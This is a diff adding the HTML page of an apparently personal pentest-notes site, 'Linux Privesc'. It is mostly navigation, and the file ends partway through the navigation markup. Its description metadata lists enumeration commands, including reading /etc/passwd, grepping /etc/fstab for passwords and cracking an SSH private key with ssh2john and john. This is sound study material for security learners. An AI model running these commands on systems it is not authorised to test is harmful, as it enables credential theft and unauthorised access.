@@ -1,0 +1,2960 @@
+<!doctype html>
+<html lang="en" data-bs-theme="auto">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-500.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-700.woff2" as="font" type="font/woff2" crossorigin>
+<script 
+  src="/js/color-mode.f14b3e296de1d0b69e75af684b62a4a912a2cadab04e36123407cd8388204f1d.js"
+  integrity="sha256-8Us&#43;KW3h0Laeda9oS2KkqRKiytqwTjYSNAfNg4ggTx0=">
+</script>
+
+
+<link rel="stylesheet" href="/main.1542a5884e04a94d737f95f75653bbae5d9d951aeefab7705a9db5f7a85e58fed8b1c2f686c1303120bb66c4ac2cbfbf1317d05cde7d463eccc899dbb8088787.css" integrity="sha512-FUKliE4EqU1zf5X3VlO7rl2dlRru&#43;rdwWp2196heWP7YscL2hsEwMSC7ZsSsLL&#43;/ExfQXN59Rj7MyJnbuAiHhw==" crossorigin="anonymous">
+
+<noscript><style>img.lazyload { display: none; }</style></noscript><base href="http://localhost:1313/notes/ad/local-privilege-escalation/linux-privesc/">
+
+  <link rel="canonical" href="http://localhost:1313/notes/ad/local-privilege-escalation/linux-privesc/">
+
+
+<title>Linux Privesc  |  P4V1C</title>
+<meta name="description" content="">
+
+    
+    <link rel="icon" href="/favicon.ico" sizes="32x32">
+    
+      <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+    
+      <link
+        rel="apple-touch-icon"
+        href="/apple-touch-icon.png"
+        sizes="180x180"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-192x192.png"
+        sizes="192x192"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-512x512.png"
+        sizes="512x512"
+        type="image/png"
+      >
+<link rel="manifest" href="/manifest.webmanifest">
+
+<meta property="og:url" content="http://localhost:1313/notes/ad/local-privilege-escalation/linux-privesc/">
+  <meta property="og:site_name" content="P4V1C">
+  <meta property="og:title" content="Linux Privesc">
+  <meta property="og:description" content="Information Gathering Environment Enumeration #Environment_Enumeration
+Determine the operating system and version : cat /etc/os-releaseDisplay the system’s PATH variable: echo $PATHShow the environment variables: envDisplay detailed system information: uname -aGather information about the CPU type/version: lscpuIdentify available login shells : cat /etc/shells bash --versionEnumerate block devices : lsblkCheck for credentials in /etc/fstab : cat /etc/fstab | grep -E &#39;password|username|credential&#39;Grab a hash from id_rsa : ssh2john id_rsa &gt; ssh.hash john --wordlist=/usr/share/wordlist/rockyou.txt ssh.hashDisplay the routing table to view available networks and interfaces: netstat -rnCheck for domain environments and internal DNS configuration: cat /etc/resolv.confEnumerate users from /etc/passwd: cat /etc/passwd | cut -f1 -d:Display information about groups on the system: cat /etc/groupList members of interesting groups, e.g., ‘sudo’: getent group sudoDisplay information about mounted file systems: df -hDisplay details of unmounted file systems from /etc/fstab: cat /etc/fstab | grep -v &#34;#&#34; | column -tList all hidden files : find / -type f -name &#34;.*&#34; -exec ls -l {} \; 2&gt;/dev/null | grep htb-studentList all hidden directories : find / -type d -name &#34;.*&#34; -ls 2&gt;/dev/nullDisplay information about temporary files and directories: ls -l /tmp /var/tmp /dev/shmLinux Services &amp; Internals Enumeration #Linux_Services_Internals_Enumeration">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="notes">
+    <meta property="article:published_time" content="2023-09-07T16:06:50+02:00">
+    <meta property="article:modified_time" content="2023-09-07T16:06:50+02:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Linux Privesc">
+  <meta name="twitter:description" content="Information Gathering Environment Enumeration #Environment_Enumeration
+Determine the operating system and version : cat /etc/os-releaseDisplay the system’s PATH variable: echo $PATHShow the environment variables: envDisplay detailed system information: uname -aGather information about the CPU type/version: lscpuIdentify available login shells : cat /etc/shells bash --versionEnumerate block devices : lsblkCheck for credentials in /etc/fstab : cat /etc/fstab | grep -E &#39;password|username|credential&#39;Grab a hash from id_rsa : ssh2john id_rsa &gt; ssh.hash john --wordlist=/usr/share/wordlist/rockyou.txt ssh.hashDisplay the routing table to view available networks and interfaces: netstat -rnCheck for domain environments and internal DNS configuration: cat /etc/resolv.confEnumerate users from /etc/passwd: cat /etc/passwd | cut -f1 -d:Display information about groups on the system: cat /etc/groupList members of interesting groups, e.g., ‘sudo’: getent group sudoDisplay information about mounted file systems: df -hDisplay details of unmounted file systems from /etc/fstab: cat /etc/fstab | grep -v &#34;#&#34; | column -tList all hidden files : find / -type f -name &#34;.*&#34; -exec ls -l {} \; 2&gt;/dev/null | grep htb-studentList all hidden directories : find / -type d -name &#34;.*&#34; -ls 2&gt;/dev/nullDisplay information about temporary files and directories: ls -l /tmp /var/tmp /dev/shmLinux Services &amp; Internals Enumeration #Linux_Services_Internals_Enumeration">
+      <meta name="twitter:site" content="@getdoks">
+
+    
+    
+    
+    <script type="application/ld+json">
+  {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "About Me",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/",
+       "name": "Notes",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/ad/",
+       "name": "Ad",
+       "position": 3
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/ad/local-privilege-escalation/",
+       "name": "Local Privilege Escalation",
+       "position": 4
+     },
+     {
+       "@type": "ListItem",
+       "name": "Linux Privesc",
+       "position": 5
+     }
+   ]
+ }
+</script>
+
+
+
+
+
+</head>
+
+  
+  <body class="single section notes" data-bs-spy="scroll" data-bs-target="#toc" data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll="true" tabindex="0">
+    <div class="sticky-top">
+<header class="navbar navbar-expand-lg">
+  <div class="container-lg">
+  
+    <a class="navbar-brand me-auto me-lg-3" href="/">P4V1C</a>
+
+    
+    
+    <button type="button" id="searchToggleMobile" class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <circle cx="10" cy="10" r="7"></circle>
+        <line x1="21" y1="21" x2="15" y2="15"></line>
+      </svg>
+    </button>
+    
+    <button class="btn btn-link d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavSection" aria-controls="offcanvasNavSection" aria-label="Open section navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <path d="M12 12m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 5m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+      </svg>
+    </button>
+    <div class="offcanvas offcanvas-start d-lg-none" tabindex="-1" id="offcanvasNavSection" aria-labelledby="offcanvasNavSectionLabel">
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavSectionLabel">Notes</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+      <div class="offcanvas-body">
+        <aside class="doks-sidebar mt-n3">
+          <nav id="doks-docs-nav" aria-label="Tertiary navigation">
+            
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details open>
+      <summary>AD</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details open>
+      <summary>Local Privilege escalation</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li class="active" >
+      <a aria-current="page" href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Tools</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/impacket/">Impacket</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/netexec/">Netexec</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/powerview/">Powerview</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ad-cs/">AD CS</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/c2/">C2</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/delegation/">Delegation</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/discovery/">Discovery</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/hash-stealing/">Hash stealing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/linux/">Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/password-looting/">Password looting</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/phishing/">Phishing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/pivot/">Pivot</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tickets/">Tickets</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/transfert/">Transfert</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/trust-attack/">Trust Attack</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Reverse Shell</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/shell-and-payload/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/powershell/">Powershell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/python/">Python</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Webs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/web/access-control/">Access Control</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/api-testing/">API Testing</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/authentication/">Authentication</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/deserialization/">Deserialization</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/file-upload/">File Upload</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/git/">Git</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/graphsql/">Graphsql</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/jwt/">JWT</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/path-traversal/">Path Traversal</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/race-conditon/">Race Conditon</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/ssrf/">SSRF</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/web-cache/">Web Cache</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/wordpress/">Wordpress</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xss/">XSS</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xxe/">XXE</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Services</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/services/ftp/">FTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/iis/">IIS</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/ldap/">Ldap</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/mssql-mysql/">Mssql-Mysql</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rpcbind/">RPCbind</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rsync/">Rsync</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rtsp/">RTSP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/smtp/">SMTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/snmp/">SNMP</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Labs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>HTB</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/htb/analysis/">Analysis</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/caption/">Caption</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/certified/">Certified</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/cicada/">Cicada</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/hospital/">Hospital</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/infiltrator/">Infiltrator</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/perfection/">Perfection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/pov/">POV</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Vulnlab</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby/">Baby</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby2/">Baby2</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/breach/">Breach</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/bruno/">Bruno</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/build/">Build</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/data/">Data</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/delegate/">Delegate</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/escape/">Escape</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/feedback/">Feedback</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/forgotten/">Forgotten</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/heron/">Heron</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/hybrid/">Hybrid</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/lock/">Lock</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/media/">Media</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/reflection/">Reflection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/retro/">Retro</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sendai/">Sendai</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sync/">Sync</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tea/">Tea</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tengu/">Tengu</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/trusted/">Trusted</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Pwn-Reverse</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
+  </li>
+
+  <li>
+    <details>
+      <summary>CTf</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Dev</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/code/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c/">C</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c-/">C&#43;&#43;</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/go/">Go</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/java/">Java</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/lua/">Lua</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/php/">Php</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/ruby/">Ruby</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Ressources</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/command-linux/">Command Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/kvm/">Kvm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/link/">Link</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/tmux/">Tmux</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Crypto</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/crypto/maths/">Maths</a>
+  </li>
+
+  <li>
+      <a href="/notes/crypto/scripting/">Scripting</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+          </nav>
+        </aside>
+      </div>
+    </div>
+    
+    <button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavMain" aria-controls="offcanvasNavMain" aria-label="Open main navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <line x1="4" y1="8" x2="20" y2="8"></line>
+        <line x1="4" y1="16" x2="20" y2="16"></line>
+      </svg>
+    </button>
+
+    
+    <div class="offcanvas offcanvas-end h-auto" tabindex="-1" id="offcanvasNavMain" aria-labelledby="offcanvasNavMainLabel">
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavMainLabel">P4V1C</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+         </svg>
+        </button>
+      </div>
+      
+      <div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between">
+        <ul class="navbar-nav flex-grow-1"><li class="nav-item">
+                <a class="nav-link active" href="http://localhost:1313/notes/ad/ad-cs" aria-current="true">Notes</a>
+              </li>
+            <li class="nav-item">
+                <a class="nav-link" href="http://localhost:1313/blog/">Blog</a>
+              </li>
+            </ul>
+
+        
+        
+        <button type="button" id="searchToggleDesktop" class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <circle cx="10" cy="10" r="7"></circle>
+            <line x1="21" y1="21" x2="15" y2="15"></line>
+          </svg>
+        </button>
+        
+        
+        
+        <button id="buttonColorMode" class="btn btn-link mx-auto nav-link p-0 ms-lg-2 me-lg-1" type="button" aria-label="Toggle theme">
+          <svg data-bs-theme-value="dark" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
+          </svg>
+          <svg data-bs-theme-value="light" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M12 12m-4 0a4 4 0 1 0 8 0a4 4 0 1 0 -8 0m-5 0h1m8 -9v1m8 8h1m-9 8v1m-6.4 -15.4l.7 .7m12.1 -.7l-.7 .7m0 11.4l.7 .7m-12.1 -.7l-.7 .7"></path>
+          </svg>
+        </button>
+        
+        <ul id="socialMenu" class="nav mx-auto flex-row order-lg-4">
+          <li class="nav-item">
+              <a class="nav-link social-link" href="https://github.com/thuliteio/doks"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"></path><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path></svg><small class="ms-2 visually-hidden">GitHub</small></a>
+            </li>
+          </ul>
+        
+        </div>
+    </div>
+
+    
+    </div>
+</header>
+</div>
+
+<div class="modal" id="searchModal" tabindex="-1" aria-labelledby="searchModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h1 class="modal-title fs-5 visually-hidden" id="searchModalLabel">Search</h1>
+        <button type="button" class="btn-close visually-hidden" data-bs-dismiss="modal" aria-label="Close"></button>
+        <div class="search-input flex-grow-1 d-none">
+          <form id="search-form" class="search-form" action="#" method="post" accept-charset="UTF-8" role="search">
+            <label for="query" class="visually-hidden">Search</label>
+            <div class="d-flex">
+              <input type="search" id="query" name="query" class="search-text form-control form-control-lg" placeholder="Search" aria-label="Search" maxlength="128" autocomplete="off">
+              <button type="button" class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss="modal" aria-label="Close">Cancel</button>
+            </div>
+          </form>
+        </div>
+      </div>
+      <div class="modal-body">
+        <p class="search-loading status message d-none mt-3 text-center">Loading search index…</p>
+        <p class="search-no-recent message d-none mt-3 text-center">No recent searches</p>
+        <p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class="query-no-results">Query here</span></strong>"</p>
+        <div id="searchResults" class="search-results"></div>
+        <template>
+          <article class="search-result list-view">
+            <div class="card my-3">
+              <div class="card-body">
+                <header>
+                  <h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href="#">Title here</a></h2>
+                  <div class="submitted d-none"><time class="created-date">Date here</time></div>
+                </header>
+                <div class="content">Summary here</div>
+              </div>
+            </div>
+          </article>
+        </template>
+      </div>
+      <div class="modal-footer">
+        <ul class="list-inline me-auto d-none d-md-block">
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4M7 11.53088l-3-3 3-3"></path></g></svg></kbd><span class="DocSearch-Label">to select</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8M10.5 8.5l-3 3-3-3"></path></g></svg></kbd><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8M10.5 6.5l-3-3-3 3"></path></g></svg></kbd><span class="DocSearch-Label">to navigate</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd><span class="DocSearch-Label">to close</span></li>
+        </ul>
+        <p class="d-md-none">Search by <a class="text-decoration-none" href="https://github.com/nextapps-de/flexsearch">FlexSearch</a></p>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+    <div class="wrap container-lg" role="document">
+      <div class="content">
+      
+        
+	<div class="row flex-xl-nowrap">
+		<div class="col-lg-5 col-xl-4 docs-sidebar d-none d-lg-block">
+			
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details open>
+      <summary>AD</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details open>
+      <summary>Local Privilege escalation</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li class="active" >
+      <a aria-current="page" href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Tools</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/impacket/">Impacket</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/netexec/">Netexec</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/powerview/">Powerview</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
